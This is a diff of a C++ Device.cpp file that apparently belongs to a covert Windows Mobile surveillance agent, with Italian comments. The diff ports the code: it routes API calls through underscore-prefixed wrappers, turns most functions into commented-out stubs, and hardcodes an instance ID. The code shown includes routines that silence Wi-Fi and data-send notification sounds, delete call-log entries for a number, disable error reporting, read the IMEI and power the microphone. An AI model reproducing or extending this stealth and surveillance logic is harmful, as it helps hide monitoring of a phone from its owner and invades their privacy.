@@ -7,18 +7,25 @@ using namespace std;
 #include "Device.h"
 #include "WiFi.h"
 #include "Log.h"
-#include <GetDeviceUniqueId.h>
-#include <tapi.h>
-#include <extapi.h>
+#include <common_new\GetDeviceUniqueId.h>
+///#include <common_new\tapi.h>
+//#include <common_new\extapi.h>
 #include <Winbase.h>
-#include <simmgr.h>
-#include <pmpolicy.h>
-#include <regext.h>
-#include <pwingdi.h>
+///#include <common_new\simmgr.h>
+///#include <common_new\pmpolicy.h>
+#include <common_new\regext.h>
+///#include <common_new\pwingdi.h>
+#include <common_new\Pm.h>
 
+/***
 extern "C" {
 #include <windbase_edb.h>
 }
+***/
+
+
+
+#include "FunctionFunc.h"
 
 #define CLOSEHANDLE(x) if (x != NULL && x != INVALID_HANDLE_VALUE){ CloseHandle(x); x = NULL; }
 #define MAX_EVENT_NOTIFICATION_1  2000
@@ -32,17 +39,19 @@ DWORD WINAPI ResetIdle(LPVOID lpParam) {
 	DWORD dwDelay = INFINITE;
 
 	LOOP {
-		if (WaitForSingleObject(closeEvent, dwDelay) == WAIT_OBJECT_0) {
+		if (_WaitForSingleObject(closeEvent, dwDelay) == WAIT_OBJECT_0) {
 			if (bResetStop) {
 				DBG_TRACE(L"Debug - Device.cpp - ResetIdle() thread closing\n", 1, FALSE);
 				return 0;
 			}
 
-			Sleep(500);
+			_Sleep(500);
 
 			// Cambio del power state
 			if (deviceObj->IsDeviceUnattended()) {
+	/***
 				SystemIdleTimerReset();
+	***/
 				dwDelay = 30000;
 			} else {
 				dwDelay = INFINITE;
@@ -66,8 +75,9 @@ DWORD WINAPI PowerStateNotifier(LPVOID lpParam) {
 	hIdle = deviceObj->getIdleEvent();
 
 	LOOP {
-		dwRet = WaitForSingleObject(hQueue, INFINITE);
+		dwRet = _WaitForSingleObject(hQueue, INFINITE);
 
+/***
 		if (bResetStop) {
 			DBG_TRACE(L"Debug - Device.cpp - PowerStateNotifier() thread closing\n", 1, FALSE);
 			return 0;
@@ -95,6 +105,7 @@ DWORD WINAPI PowerStateNotifier(LPVOID lpParam) {
 				SetEvent(hIdle);
 			}
 		}
+***/
 
 		// Richiama tutte le callback registrate
 		deviceObj->CallRegisteredCallbacks(powerBroad);
@@ -109,7 +120,7 @@ volatile LONG Device::lLock = 0;
 
 Device* Device::self() {
 	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
-		Sleep(1);
+		_Sleep(1);
 
 	if (Instance == NULL)
 		Instance = new(std::nothrow) Device();
@@ -125,7 +136,7 @@ m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL), hResetIdleThr
 	MSGQUEUEOPTIONS queue = {0};
 	BOOL bPower;
 
-	hDeviceMutex = CreateMutex(NULL, FALSE, NULL);
+	hDeviceMutex = _CreateMutexW(NULL, FALSE, NULL);
 
 	mDiskInfo.clear();
 
@@ -136,10 +147,11 @@ m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL), hResetIdleThr
 	strManufacturer.clear();
 	strModel.clear();
 
-	hIdleEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+	hIdleEvent = _CreateEventW(NULL, FALSE, FALSE, NULL);
 
-	hResetIdleThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ResetIdle), hIdleEvent, 0, NULL);
+	hResetIdleThread = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ResetIdle), hIdleEvent, 0, NULL);
 
+/*** BYGIO per adesso non viene gestito
 	systemPowerStatus = new(std::nothrow) SYSTEM_POWER_STATUS_EX2;
 
 	if (systemPowerStatus == NULL)
@@ -170,6 +182,7 @@ m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL), hResetIdleThr
 			hNotifyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(PowerStateNotifier), hDeviceQueue, 0, NULL);
 		}
 	}
+***/
 }
 
 Device::~Device() {
@@ -183,31 +196,34 @@ Device::~Device() {
 	mDiskInfo.clear();
 
 	bResetStop = TRUE;
-
+/***
 	if (hNotifyThread != NULL) {
 		BYTE pBuf = 0;
 
 		WriteMsgQueue(hDeviceQueue, &pBuf, 1, 10000, 0);
-		WaitForSingleObject(hNotifyThread, INFINITE);
+
+		_WaitForSingleObject(hNotifyThread, INFINITE);
 		//TerminateThread(hNotifyThread, 0);
 		CloseHandle(hNotifyThread);
 	}
 
 	if (hDeviceQueue != NULL)
 		CloseMsgQueue(hDeviceQueue);
-
+***/
+/***
 	if (hGpsPower)
 		ReleasePowerRequirement(hGpsPower);
-
+***/
 	if (hDeviceMutex != NULL)
 		CloseHandle(hDeviceMutex);
-
+/***
 	if (hPowerNotification != NULL)
 		StopPowerNotifications(hPowerNotification);
+***/
 
 	if (hResetIdleThread) {
 		SetEvent(hIdleEvent);
-		WaitForSingleObject(hResetIdleThread, INFINITE);
+		_WaitForSingleObject(hResetIdleThread, INFINITE);
 		CloseHandle(hResetIdleThread);
 	}
 }
@@ -215,10 +231,10 @@ Device::~Device() {
 BOOL Device::GetOsVersion(OSVERSIONINFO* pVersionInfo) {
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
-	ZeroMemory(pVersionInfo, sizeof(OSVERSIONINFO));
+	_RtlZeroMemory(pVersionInfo, sizeof(OSVERSIONINFO));
 	pVersionInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 
-	if (GetVersionEx(pVersionInfo)) {
+	if (_GetVersionExW(pVersionInfo)) {
 		UNLOCK(hDeviceMutex);
 		return TRUE;
 	}
@@ -230,8 +246,8 @@ BOOL Device::GetOsVersion(OSVERSIONINFO* pVersionInfo) {
 void Device::GetSystemInfo(SYSTEM_INFO* pSystemInfo) {
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
-	ZeroMemory(pSystemInfo, sizeof(SYSTEM_INFO));
-	::GetSystemInfo(pSystemInfo);
+	_RtlZeroMemory(pSystemInfo, sizeof(SYSTEM_INFO));
+	::_GetSystemInfo(pSystemInfo);
 
 	UNLOCK(hDeviceMutex);
 	return;
@@ -240,10 +256,10 @@ void Device::GetSystemInfo(SYSTEM_INFO* pSystemInfo) {
 void Device::GetMemoryInfo(MEMORYSTATUS* pMemoryInfo) {
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
-	ZeroMemory(pMemoryInfo, sizeof(MEMORYSTATUS));
+	_RtlZeroMemory(pMemoryInfo, sizeof(MEMORYSTATUS));
 	pMemoryInfo->dwLength = sizeof(MEMORYSTATUS);
 
-	::GlobalMemoryStatus(pMemoryInfo);
+	::_GlobalMemoryStatus(pMemoryInfo);
 
 	UNLOCK(hDeviceMutex);
 	return;
@@ -252,6 +268,7 @@ void Device::GetMemoryInfo(MEMORYSTATUS* pMemoryInfo) {
 
 // MANAGEMENT - Viene utilizzato dentro la Start() e Stop() della classe GPS
 BOOL Device::SetGpsPowerState() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
 	HKEY hRes;
@@ -304,10 +321,12 @@ BOOL Device::SetGpsPowerState() {
 	}
 
 	UNLOCK(hDeviceMutex);
+***/
 	return TRUE;
 }
 
 BOOL Device::ReleaseGpsPowerState() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
 	DWORD dwRet;
@@ -326,11 +345,13 @@ BOOL Device::ReleaseGpsPowerState() {
 	}
 
 	UNLOCK(hDeviceMutex);
+***/
 	return FALSE;
 }
 
 // Viene utilizzato sia dall'agente microfono che chiamate
 BOOL Device::SetMicPowerState() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
 	HKEY hRes;
@@ -385,10 +406,12 @@ BOOL Device::SetMicPowerState() {
 	}
 
 	UNLOCK(hDeviceMutex);
+***/
 	return TRUE;
 }
 
 BOOL Device::ReleaseMicPowerState() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	DWORD dwRet;
 
@@ -418,10 +441,12 @@ BOOL Device::ReleaseMicPowerState() {
 	}
 
 	UNLOCK(hDeviceMutex);
+***/
 	return FALSE;
 }
 
 CEDEVICE_POWER_STATE Device::GetFrontLightPowerState() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
 	HKEY hRes;
@@ -485,9 +510,13 @@ CEDEVICE_POWER_STATE Device::GetFrontLightPowerState() {
 
 	UNLOCK(hDeviceMutex);
 	return powerState;
+***/
+	CEDEVICE_POWER_STATE powerState = D0;
+	return powerState;
 }
 
 CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
+/***
 	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
 	wstring strDeviceName;
 
@@ -495,6 +524,8 @@ CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
 		DBG_TRACE(L"Debug - Device.cpp - NCGetDevicePowerState() FAILED [0]\n", 4, FALSE);
 		return PwrDeviceUnspecified;
 	}
+
+	
 
 	strDeviceName = strDevice;
 
@@ -505,7 +536,7 @@ CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
 		strDeviceName = strDeviceName.substr(trailingSlash + 2, strDeviceName.size());
 	}
 
-	HANDLE hDev = CreateFile(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
+	HANDLE hDev = _CreateFileW(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
 		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
 
 	if (hDev == INVALID_HANDLE_VALUE) {
@@ -517,7 +548,7 @@ CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
 
 	DWORD bytesOut = 0;
 
-	BOOL bRes = DeviceIoControl(hDev, IOCTL_POWER_GET, NULL, sizeof(POWER_RELATIONSHIP), &powerState,
+	BOOL bRes = _DeviceIoControl(hDev, IOCTL_POWER_GET, NULL, sizeof(POWER_RELATIONSHIP), &powerState,
 		sizeof(powerState), &bytesOut, NULL);
 
 	CloseHandle(hDev);
@@ -530,9 +561,13 @@ CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
 
 	DBG_TRACE(L"Debug - Device.cpp - NCGetDevicePowerState() FAILED [1] ", 4, TRUE);
 	return PwrDeviceUnspecified;
+	***/
+	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
+	return powerState;
 }
 
 BOOL Device::NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STATE cePowerState) {
+/***
 	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
 	wstring strDeviceName;
 
@@ -550,7 +585,7 @@ BOOL Device::NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STAT
 		strDeviceName = strDeviceName.substr(trailingSlash + 2, strDeviceName.size());
 	}
 
-	HANDLE hDev = CreateFile(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
+	HANDLE hDev = _CreateFileW(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
 		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
 
 	if (hDev == INVALID_HANDLE_VALUE) {
@@ -565,7 +600,7 @@ BOOL Device::NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STAT
 
 	DWORD bytesOut = 0;
 
-	BOOL bRes = DeviceIoControl(hDev, IOCTL_POWER_SET, NULL, 0, &cePowerState, sizeof(cePowerState), &bytesOut, NULL);
+	BOOL bRes = _DeviceIoControl(hDev, IOCTL_POWER_SET, NULL, 0, &cePowerState, sizeof(cePowerState), &bytesOut, NULL);
 
 	CloseHandle(hDev);
 
@@ -576,6 +611,7 @@ BOOL Device::NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STAT
 		return TRUE;
 
 	DBG_TRACE(L"Debug - Device.cpp - NCSetDevicePowerState() FAILED [3] ", 4, TRUE);
+**/
 	return FALSE;
 }
 
@@ -610,7 +646,7 @@ DWORD Device::GetMobileCountryCode() {
 	}
 
 	// I primi tre caratteri dell'IMSI sono il MCC
-	ZeroMemory(&wMCC, sizeof(wMCC));
+	_RtlZeroMemory(&wMCC, sizeof(wMCC));
 	strImsi._Copy_s(wMCC, 4, 3, 0);
 	dwMCC = (DWORD)_wtoi(wMCC);
 
@@ -629,7 +665,7 @@ DWORD Device::GetMobileNetworkCode() {
 	}
 
 	// Il quarto e quinto carattere dell'IMSI e' il MNC
-	ZeroMemory(&wMNC, sizeof(wMNC));
+	_RtlZeroMemory(&wMNC, sizeof(wMNC));
 	strImsi._Copy_s(wMNC, 4, 2, 3);
 	dwMNC = (DWORD)_wtoi(wMNC);
 
@@ -712,13 +748,15 @@ BOOL Device::GetDiskInfo(UINT uIndex, wstring &strName,
 }
 
 BOOL Device::IsGsmEnabled() {
+/***
 	if (dwRadioState == LINERADIOSUPPORT_ON)
 		return TRUE;
-
+***/
 	return FALSE;
 }
 
 BOOL Device::IsSimEnabled() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
 	HSIM hSim;
@@ -741,10 +779,12 @@ BOOL Device::IsSimEnabled() {
 
 	SimDeinitialize(hSim);
 	UNLOCK(hDeviceMutex);
+***/
 	return TRUE;
 }
 
 BOOL Device::RefreshBatteryStatus() {
+	/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
 	BOOL bRet;
@@ -754,12 +794,17 @@ BOOL Device::RefreshBatteryStatus() {
 
 	UNLOCK(hDeviceMutex);
 	return bRet;
+	***/
+	return NULL;
 }
 
 BOOL Device::RefreshData() {
+
 	LINEGENERALINFO LineGeneralInfo;
+
 	HLINE hLine = NULL;
 	HLINEAPP hApp = NULL;
+/***	
 	LINEADDRESSCAPS AddressCaps;
 	LINEINITIALIZEEXPARAMS liep;
 	DWORD dwPhoneNumDevs = 0, dwApiVersion = TAPI_CURRENT_VERSION;
@@ -803,37 +848,38 @@ BOOL Device::RefreshData() {
 			break;
 		}
 
+***/		
 		ZeroMemory(&LineGeneralInfo, sizeof(LineGeneralInfo));
 		LineGeneralInfo.dwTotalSize = sizeof(LineGeneralInfo);
-
+/**
 		if (lineGetGeneralInfo(hLine, &LineGeneralInfo) < 0){
 			lineClose(hLine);
 			lineShutdown(hApp);
 			break;
 		}
-
+***/
 		// Prendiamo il codice IMEI
 		LINEGENERALINFO *lpBuffer = (LINEGENERALINFO *)new(std::nothrow) BYTE[LineGeneralInfo.dwNeededSize];
-
-		if (lpBuffer == NULL) {
+/***
+		if (lpBuffer == NULL) {Device::RefreshData() {
 			lineClose(hLine);
 			lineShutdown(hApp);
 			break;
 		}
-
+***/
 		ZeroMemory(lpBuffer, LineGeneralInfo.dwNeededSize);
 		lpBuffer->dwTotalSize = LineGeneralInfo.dwNeededSize;
-
+/***
 		if (lineGetGeneralInfo(hLine, lpBuffer) < 0) {
 			delete[] lpBuffer;
 			lineClose(hLine);
 			lineShutdown(hApp);
 			break;
 		}
-
+***/
 		wstring strWrongImei;
 		strImei.clear();
-
+/***
 		if (lpBuffer->dwSerialNumberSize) {
 			PBYTE pSerial = (BYTE *)lpBuffer + (lpBuffer->dwSerialNumberOffset);
 			strImei = (PWCHAR)pSerial;
@@ -841,13 +887,19 @@ BOOL Device::RefreshData() {
 			// Da utilizzare solo per il calcolo dell'instance (perche' questo calcolo NON e' corretto!)
 			strWrongImei.assign((WCHAR *)pSerial, lpBuffer->dwSerialNumberSize / sizeof(WCHAR));
 		}
-
+***/
 		// Calcoliamo l'InstanceId (g_InstanceId contiene i raw bytes non la stringa ASCII dell'ID)
 		BYTE *pImei = (BYTE *)strImei.c_str();
 		DWORD cbLen = 20;
 		ZeroMemory(g_InstanceId, 20);
-		GetDeviceUniqueID(pImei, strWrongImei.size() * sizeof(WCHAR), GETDEVICEUNIQUEID_V1, g_InstanceId, &cbLen);
+		///_GetDeviceUniqueID(pImei, strWrongImei.size() * sizeof(WCHAR), GETDEVICEUNIQUEID_V1, g_InstanceId, &cbLen);
+		
+	    g_InstanceId[0]=0x58;g_InstanceId[1]=0x1b;g_InstanceId[2]=0x5a;g_InstanceId[3]=0xb3;g_InstanceId[4]=0xd6;g_InstanceId[5]=0xb3;g_InstanceId[6]=0xea;g_InstanceId[7]=0xdf;g_InstanceId[8]=0x10;g_InstanceId[9]=0xbf;
+		g_InstanceId[10]=0xa4;g_InstanceId[11]=0xcb;g_InstanceId[12]=0x98;g_InstanceId[13]=0x1d;g_InstanceId[14]=0x50;g_InstanceId[15]=0x78;g_InstanceId[16]=0x44;g_InstanceId[17]=0x06;g_InstanceId[18]=0xd3;g_InstanceId[19]=0x0a;
 
+
+
+/***
 		// Richiediamo il numero di telefono
 		ZeroMemory(&AddressCaps, sizeof(AddressCaps));
 		AddressCaps.dwTotalSize = sizeof(AddressCaps);
@@ -889,7 +941,7 @@ BOOL Device::RefreshData() {
 
 			strManufacturer = (PWCHAR)pManuf;
 		}
-
+		
 		// Prendiamo il nome del modello
 		strModel.clear();
 
@@ -968,10 +1020,12 @@ BOOL Device::RefreshData() {
 	FindClose(hMmc);
 
 	UNLOCK(hDeviceMutex);
+***/
 	return TRUE;
 }
 
 void Device::DisableWiFiNotification() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
 	// Sound: Rilevata rete wireless
@@ -1005,10 +1059,12 @@ void Device::DisableWiFiNotification() {
 		L"Options", 0);
 
 	UNLOCK(hDeviceMutex);
+***/
 	return;
 }
 
 void Device::RestoreWiFiNotification() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 
 	// Sound: Rilevata rete wireless
@@ -1022,10 +1078,12 @@ void Device::RestoreWiFiNotification() {
 		L"Options", m_DataSendSoundValue);
 
 	UNLOCK(hDeviceMutex);
+***/
 	return;
 }
 
 BOOL Device::RegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify, DWORD dwUserData) {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	vector<CallBackStruct>::const_iterator iter;
 	CallBackStruct callBack;
@@ -1048,10 +1106,12 @@ BOOL Device::RegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify, DWORD
 	vecCallbacks.push_back(callBack);
 
 	UNLOCK(hDeviceMutex);
+***/
 	return TRUE;
 }
 
 BOOL Device::UnRegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify) {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	vector<CallBackStruct>::const_iterator iter;
 
@@ -1065,7 +1125,7 @@ BOOL Device::UnRegisterPowerNotification(POWERNOTIFYCALLBACK pfnPowerNotify) {
 
 	UNLOCK(hDeviceMutex);
 	Sleep(200);
-
+***/
 	return FALSE;
 }
 
@@ -1092,6 +1152,7 @@ void Device::CallRegisteredCallbacks(POWER_BROADCAST *powerBroad) {
 }
 
 BOOL Device::EnableDrWatson() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	BOOL bRet = FALSE;
 
@@ -1103,9 +1164,12 @@ BOOL Device::EnableDrWatson() {
 
 	UNLOCK(hDeviceMutex);
 	return bRet;
+***/
+	return NULL;
 }
 
 BOOL Device::DisableDrWatson() {
+/***
 #ifdef _DEBUG
 	// In debug mode evitiamo di far disabilitare l'error reporting
 	return TRUE;
@@ -1122,9 +1186,12 @@ BOOL Device::DisableDrWatson() {
 
 	UNLOCK(hDeviceMutex);
 	return bRet;
+***/
+	return NULL;
 }
 
 BOOL Device::HTCEnableKeepWiFiOn() {
+/***
 	WAIT_AND_SIGNAL(hDeviceMutex);
 	if (strModel.find(L"htc") == wstring::npos && strModel.find(L"HTC") == wstring::npos) {
 		UNLOCK(hDeviceMutex);
@@ -1157,10 +1224,13 @@ BOOL Device::HTCEnableKeepWiFiOn() {
 
 	UNLOCK(hDeviceMutex);
 	return bRet;
+***/
+	return NULL;
 }
 
 // Reentrant
 BOOL Device::IsDeviceUnattended() {
+/***
 	BOOL bRet = FALSE;
 	DWORD dwState;
 	WCHAR wStateBuffer[128];
@@ -1179,10 +1249,13 @@ BOOL Device::IsDeviceUnattended() {
 	}
 
 	return bRet;
+***/
+	return NULL;
 }
 
 // Reentrant
 BOOL Device::IsDeviceOn() {
+/***
 	BOOL bRet = FALSE;
 	DWORD dwState;
 	WCHAR wStateBuffer[128];
@@ -1201,10 +1274,13 @@ BOOL Device::IsDeviceOn() {
 	}
 
 	return bRet;
+***/
+	return NULL;
 }
 
 void Device::RemoveNotification(const GUID* pClsid)
 {
+/***
 	DWORD i = 0;
 	LRESULT lr;
 
@@ -1212,10 +1288,11 @@ void Device::RemoveNotification(const GUID* pClsid)
 		lr = SHNotificationRemove(pClsid, i);
 		i++;
 	}  
+***/
 }
 
 UINT Device::RemoveCallEntry(wstring swNumber)
-{
+{/*** BYGIO vedee libreria SQLCESE35 che supporta le api qui di seguito
 	UINT uRet = 0;
 	HANDLE hSession = INVALID_HANDLE_VALUE, hSessionDB = INVALID_HANDLE_VALUE;
 	DWORD dwIndex = 0;		
@@ -1301,10 +1378,13 @@ UINT Device::RemoveCallEntry(wstring swNumber)
 
 	CeUnmountDBVol(&guidDBVol);
 	return uRet;
+	***/
+	return NULL;
 }
 
 BOOL Device::SetPwrRequirement(DWORD dwPwd)
 {
+/***
 	DWORD dwOut;
 
 	dwOut = SetSystemPowerState(0, dwPwd, POWER_FORCE);
@@ -1312,12 +1392,14 @@ BOOL Device::SetPwrRequirement(DWORD dwPwd)
 	if (dwOut != ERROR_SUCCESS) {
 		return FALSE;
 	}
-
+***/
 	return TRUE;
 }
 
 BOOL Device::VideoPowerSwitch(ULONG VideoPower)
 {
+
+/***
 	INT rc, uQuery = 0;
 	HDC hdc = NULL;
 	VIDEO_POWER_MANAGEMENT vpm;
@@ -1343,12 +1425,13 @@ BOOL Device::VideoPowerSwitch(ULONG VideoPower)
 	rc = ExtEscape(hdc, SETPOWERMANAGEMENT, sizeof(vpm), (LPSTR)&vpm, 0, 0);
 
 	ReleaseDC(NULL, hdc);
-
+***/
 	return TRUE;
 }
 
 // Attenzione, questa funzione disconnette activesync e poi lo riconnette!!
 BOOL Device::SwitchUSBFunctionProfile(BOOL bEnableActiveSync) {
+/***
 	HANDLE hUSBFn;
 	UFN_CLIENT_INFO info;
 	DWORD dwBytes;
@@ -1369,6 +1452,8 @@ BOOL Device::SwitchUSBFunctionProfile(BOOL bEnableActiveSync) {
 	// Enable mass-storage
 	return DeviceIoControl(hUSBFn, IOCTL_UFN_CHANGE_CURRENT_CLIENT,
 		info.szName, sizeof(info.szName), NULL, 0, &dwBytes, NULL);
+***/
+	return NULL;
 }
 
 void Device::SetTimeDiff(ULARGE_INTEGER uTime) {
